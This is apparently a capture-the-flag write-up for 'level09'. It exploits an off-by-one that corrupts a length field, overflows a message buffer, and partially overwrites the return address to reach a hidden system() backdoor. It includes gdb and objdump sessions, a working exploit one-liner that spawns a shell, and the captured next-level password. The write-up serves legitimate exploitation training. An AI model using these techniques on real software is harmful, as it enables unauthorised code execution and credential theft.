## Level09

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
In the file, you can see a function named `secret_backdoor`, that's the one you'll need to use.

```c
void	secret_backdoor(void) {
	char	buffer[128];

	fgets(buffer, 128, stdin);
	system(buffer);
}
```

Problem: how to trigger it.

```c
void set_username(t_msg *data) {
	char	tmp[128];
	int		i;

	memset(tmp, 0, 128);
	puts(">: Enter your username");
	printf(">>: ");
	fgets(tmp, 128, stdin);

	i = 0;
	while (i <= 40 && tmp[i]) {
		data->username[i] = tmp[i];
		i++;
	}

	printf(">: Welcome, %s", data->username);
}
```

Here in `set_username`, because of the `<=` operator, we might write one byte too many, and if we look at the data structure, where does that cause a problem?

```c
typedef struct	s_msg {
	char		msg[140];
	char		username[40];
	int			msg_len;
}				t_msg;
```

It fall into `msg_len`, so by changing `msg_len`, we can copy more data using `strncpy` in `set_msg`.

```c
void set_msg(t_msg *data) {
	char	tmp[1024];

	memset(tmp, 0, 1024);
	puts(">: Msg @Unix-Dude");
	printf(">>: ");
	fgets(tmp, 1024, stdin);
	strncpy(data->msg, tmp, data->msg_len);
}
```

All that's left is to find `saved EIP` and set the address of `secret_backdoor` to it.

Step 1: Find a username that allows you to copy more using `strncpy`.

```bash
$ python -c "print('A' * 40 + chr(255))"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```

Step 2: Find the offset between the start of the message and `saved EIP`
</br>
<<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>> (length: 400)

```bash
$ gdb ./level09
(gdb) r
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
>: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
```

We have a problem; we're getting a segfault. We need to set a breakpoint before that.

```bash
$ gdb ./level09
(gdb) b *handle_msg+113
Breakpoint 1 at 0x931
(gdb) r
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
>: Msg sent!

Breakpoint 1, 0x0000555555554931 in handle_msg ()
(gdb) x/gx $rsp
0x7fffffffe5c8: 0x4138674137674136
```

The offset is therefore 200.

Step 3: Find `secret_backdoor`.

```bash
$ objdump -d level09 -M intel
000000000000088c <secret_backdoor>:
 88c:   55                      push   rbp
 88d:   48 89 e5                mov    rbp,rsp
 890:   48 83 c4 80             add    rsp,0xffffffffffffff80
 894:   48 8b 05 1d 17 20 00    mov    rax,QWORD PTR [rip+0x20171d]        # 201fb8 <_DYNAMIC+0x198>
 89b:   48 8b 00                mov    rax,QWORD PTR [rax]
 89e:   48 89 c2                mov    rdx,rax
 8a1:   48 8d 45 80             lea    rax,[rbp-0x80]
 8a5:   be 80 00 00 00          mov    esi,0x80
 8aa:   48 89 c7                mov    rdi,rax
 8ad:   e8 be fe ff ff          call   770 <fgets@plt>
 8b2:   48 8d 45 80             lea    rax,[rbp-0x80]
 8b6:   48 89 c7                mov    rdi,rax
 8b9:   e8 82 fe ff ff          call   740 <system@plt>
 8be:   c9                      leave
 8bf:   c3                      ret
```

All you have to do is change the first two bytes. (0x88c)

```bash
$ (python -c "print('A' * 40 + chr(202))"; python -c "print('A' * 200 + '\x8c\x08')"; python -c "print('/bin/sh')"; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
Segmentation fault (core dumped)
```

Segmentation fault ???
</br>
Actually, the problem stems from `0x088c` instead of `0x88c`; you need to figure out what the base page is.

```bash
$ gdb ./level09
(gdb) b *secret_backdoor
Breakpoint 1 at 0x88c
(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: a
>: Welcome, a
>: Msg @Unix-Dude
>>: a
>: Msg sent!
[Inferior 1 (process 2234) exited normally]
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

0x488c: The number 4 is part of the page; it never changes, even with PIE/ASLR.

```bash
$ (python -c "print('A' * 40 + chr(202))"; python -c "print('A' * 200 + '\x8c\x48')"; python -c "print('/bin/sh')"; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
